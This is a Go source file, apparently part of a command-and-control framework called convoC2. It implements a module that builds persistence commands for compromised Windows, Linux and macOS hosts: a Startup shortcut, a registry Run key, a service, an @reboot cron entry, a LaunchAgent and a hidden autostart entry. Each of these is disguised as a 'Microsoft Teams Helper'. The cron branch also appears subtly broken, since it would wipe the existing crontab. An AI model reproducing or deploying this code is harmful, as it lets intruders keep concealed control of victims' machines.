package modules

import (
	"fmt"
	"strings"
)

// PersistenceModule is a module for setting up persistence on compromised hosts
type PersistenceModule struct {
	*BaseModule
}

// NewPersistenceModule creates a new persistence module
func NewPersistenceModule() *PersistenceModule {
	base := NewBaseModule(
		"persistence",
		"Establish persistence on compromised hosts",
		"convoC2 Team",
	)

	base.RegisterOption("method", "Persistence method (startup, registry, service, cron, launchd)", "startup", true)
	base.RegisterOption("agent_path", "Path to the agent executable", "", true)
	base.RegisterOption("agent_args", "Arguments for the agent", "", false)
	base.RegisterOption("name", "Name for the persistence entry", "MSTeamsHelper", false)

	return &PersistenceModule{
		BaseModule: base,
	}
}

// Run executes the persistence module
func (m *PersistenceModule) Run(agentID string) (string, error) {
	if err := m.ValidateOptions(); err != nil {
		return "", err
	}

	method, _ := m.GetOption("method")
	agentPath, _ := m.GetOption("agent_path")
	agentArgs, _ := m.GetOption("agent_args")
	name, _ := m.GetOption("name")

	// Build the persistence command
	command := buildPersistenceCommand(method, agentPath, agentArgs, name)

	// The actual persistence would be performed by sending this command
	// to the agent specified by agentID. For now, we just return the command
	// that would be executed.
	return command, nil
}

// buildPersistenceCommand builds the appropriate command for the persistence method
func buildPersistenceCommand(method, agentPath, agentArgs, name string) string {
	var command strings.Builder

	// Determine OS by the path format
	isWindows := strings.Contains(agentPath, "\\") || (len(agentPath) > 1 && agentPath[1] == ':')

	if isWindows {
		buildWindowsPersistenceCommand(&command, method, agentPath, agentArgs, name)
	} else {
		buildUnixPersistenceCommand(&command, method, agentPath, agentArgs, name)
	}

	return command.String()
}

// buildWindowsPersistenceCommand builds Windows-specific persistence commands
func buildWindowsPersistenceCommand(command *strings.Builder, method, agentPath, agentArgs, name string) {
	switch strings.ToLower(method) {
	case "startup":
		// Windows Startup Folder
		command.WriteString("powershell -Command \"")
		command.WriteString("$startupFolder = [Environment]::GetFolderPath('Startup'); ")
		command.WriteString(fmt.Sprintf("$shortcutPath = Join-Path $startupFolder '%s.lnk'; ", name))
		command.WriteString("$WshShell = New-Object -ComObject WScript.Shell; ")
		command.WriteString(fmt.Sprintf("$shortcut = $WshShell.CreateShortcut($shortcutPath); "))
		command.WriteString(fmt.Sprintf("$shortcut.TargetPath = '%s'; ", agentPath))
		if agentArgs != "" {
			command.WriteString(fmt.Sprintf("$shortcut.Arguments = '%s'; ", agentArgs))
		}
		command.WriteString("$shortcut.WorkingDirectory = Split-Path -Parent $shortcut.TargetPath; ")
		command.WriteString(fmt.Sprintf("$shortcut.Description = '%s'; ", name))
		command.WriteString("$shortcut.WindowStyle = 7; ") // Minimized window
		command.WriteString("$shortcut.Save(); ")
		command.WriteString("if (Test-Path $shortcutPath) { Write-Output 'Persistence established: Startup folder' } else { Write-Output 'Failed to create shortcut' }")
		command.WriteString("\"")

	case "registry":
		// Windows Registry Run
		command.WriteString("powershell -Command \"")
		command.WriteString("try { ")
		command.WriteString("$keyPath = 'Registry::HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run'; ")
		if agentArgs != "" {
			command.WriteString(fmt.Sprintf("$value = '\"%s\" %s'; ", agentPath, agentArgs))
		} else {
			command.WriteString(fmt.Sprintf("$value = '\"%s\"'; ", agentPath))
		}
		command.WriteString(fmt.Sprintf("Set-ItemProperty -Path $keyPath -Name '%s' -Value $value -Type String; ", name))
		command.WriteString("Write-Output 'Persistence established: Registry Run key' ")
		command.WriteString("} catch { Write-Output ('Failed: ' + $_.Exception.Message) }")
		command.WriteString("\"")

	case "service":
		// Windows Service
		command.WriteString("powershell -Command \"")
		command.WriteString("try { ")
		command.WriteString("if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {")
		command.WriteString("Write-Output 'This command requires Administrator privileges'; exit 1 ")
		command.WriteString("} ")
		command.WriteString(fmt.Sprintf("$binaryPath = '%s'", agentPath))
		if agentArgs != "" {
			command.WriteString(fmt.Sprintf(" + ' %s'", agentArgs))
		}
		command.WriteString("; ")
		command.WriteString(fmt.Sprintf("New-Service -Name '%s' -DisplayName '%s' -Description 'Microsoft Teams Helper Service' -StartupType Automatic -BinaryPathName $binaryPath | Out-Null; ", name, name))
		command.WriteString(fmt.Sprintf("Start-Service -Name '%s'; ", name))
		command.WriteString(fmt.Sprintf("if ((Get-Service '%s').Status -eq 'Running') { Write-Output 'Persistence established: Windows Service' } else { Write-Output 'Service created but failed to start' }", name))
		command.WriteString("} catch { Write-Output ('Failed: ' + $_.Exception.Message) }")
		command.WriteString("\"")
	}
}

// buildUnixPersistenceCommand builds Unix/Linux-specific persistence commands
func buildUnixPersistenceCommand(command *strings.Builder, method, agentPath, agentArgs, name string) {
	switch strings.ToLower(method) {
	case "cron":
		// Crontab entry
		command.WriteString("(crontab -l 2>/dev/null || echo '') | ")
		if agentArgs != "" {
			command.WriteString(fmt.Sprintf("grep -v '%s' | echo \"@reboot %s %s\" | ", agentPath, agentPath, agentArgs))
		} else {
			command.WriteString(fmt.Sprintf("grep -v '%s' | echo \"@reboot %s\" | ", agentPath, agentPath))
		}
		command.WriteString("crontab - && ")
		command.WriteString("echo 'Persistence established: Crontab entry'")

	case "launchd":
		// macOS LaunchAgent
		command.WriteString("PLIST_PATH=\"$HOME/Library/LaunchAgents/")
		command.WriteString(fmt.Sprintf("%s.plist\" && ", name))
		command.WriteString("cat > \"$PLIST_PATH\" << EOL\n")
		command.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
		command.WriteString("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n")
		command.WriteString("<plist version=\"1.0\">\n")
		command.WriteString("<dict>\n")
		command.WriteString("    <key>Label</key>\n")
		command.WriteString(fmt.Sprintf("    <string>%s</string>\n", name))
		command.WriteString("    <key>ProgramArguments</key>\n")
		command.WriteString("    <array>\n")
		command.WriteString(fmt.Sprintf("        <string>%s</string>\n", agentPath))
		if agentArgs != "" {
			// Split args and add each as a string entry
			args := strings.Split(agentArgs, " ")
			for _, arg := range args {
				if arg != "" {
					command.WriteString(fmt.Sprintf("        <string>%s</string>\n", arg))
				}
			}
		}
		command.WriteString("    </array>\n")
		command.WriteString("    <key>RunAtLoad</key>\n")
		command.WriteString("    <true/>\n")
		command.WriteString("    <key>KeepAlive</key>\n")
		command.WriteString("    <true/>\n")
		command.WriteString("</dict>\n")
		command.WriteString("</plist>\nEOL\n")
		command.WriteString("chmod 644 \"$PLIST_PATH\" && ")
		command.WriteString("launchctl load \"$PLIST_PATH\" && ")
		command.WriteString("echo 'Persistence established: LaunchAgent'")

	case "startup":
		// Linux Desktop Autostart
		command.WriteString("mkdir -p \"$HOME/.config/autostart\" && ")
		command.WriteString(fmt.Sprintf("cat > \"$HOME/.config/autostart/%s.desktop\" << EOL\n", name))
		command.WriteString("[Desktop Entry]\n")
		command.WriteString("Type=Application\n")
		command.WriteString(fmt.Sprintf("Name=%s\n", name))
		command.WriteString("Comment=Microsoft Teams Helper\n")
		if agentArgs != "" {
			command.WriteString(fmt.Sprintf("Exec=%s %s\n", agentPath, agentArgs))
		} else {
			command.WriteString(fmt.Sprintf("Exec=%s\n", agentPath))
		}
		command.WriteString("Terminal=false\n")
		command.WriteString("Hidden=true\n")
		command.WriteString("X-GNOME-Autostart-enabled=true\nEOL\n")
		command.WriteString("chmod +x \"$HOME/.config/autostart/")
		command.WriteString(fmt.Sprintf("%s.desktop\" && ", name))
		command.WriteString("echo 'Persistence established: Desktop autostart'")
	}
}
